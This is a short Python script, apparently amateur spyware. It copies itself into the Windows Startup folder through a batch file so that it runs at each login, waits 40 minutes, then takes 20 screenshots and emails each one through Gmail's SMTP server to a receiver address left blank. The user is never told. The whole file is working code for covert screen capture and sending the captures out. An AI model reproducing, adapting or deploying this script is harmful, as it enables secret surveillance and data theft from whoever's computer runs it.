# I don’t know how this shit works but it still works
# import this for send logs by email
import smtplib
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.mime.base import MIMEBase
# file with my pass, u don't need for this
import ur_passord
# for doing screenshots
import pyautogui
import time
import getpass
import os

# able to use main windows folder
USER_NAME = getpass.getuser()

# attempt to add programm to start-up 
def add_to_startup(file_path="Screenshooter.exe"):
    if file_path == "Screenshooter.exe":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


# paste here ur's email
sender_email = ""
receiver_email = ""

add_to_startup()

# 20 screenshots is taken every m-sec
time.sleep(2400)


# doing, doing 20 screenshots
for i in range(20):
    # screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot1.png")

    # creating message
    message = MIMEMultipart()
    message["From"] = sender_email
    message['To'] = receiver_email
    message['Subject'] = "Report" + str(i)

    # Attach file to email
    file = "screenshot1.png"
    attachment = open(file, 'rb')

    # Send mail
    obj = MIMEBase('application', 'octet-stream')
    obj.set_payload(attachment.read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', "attachment; filename= " + file)

    message.attach(obj)
    my_message = message.as_string()

    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(sender_email, ur_passord.ur_pass)
    email_session.sendmail(sender_email, receiver_email, my_message)
    email_session.quit()

    # finished
    print("Email send success")
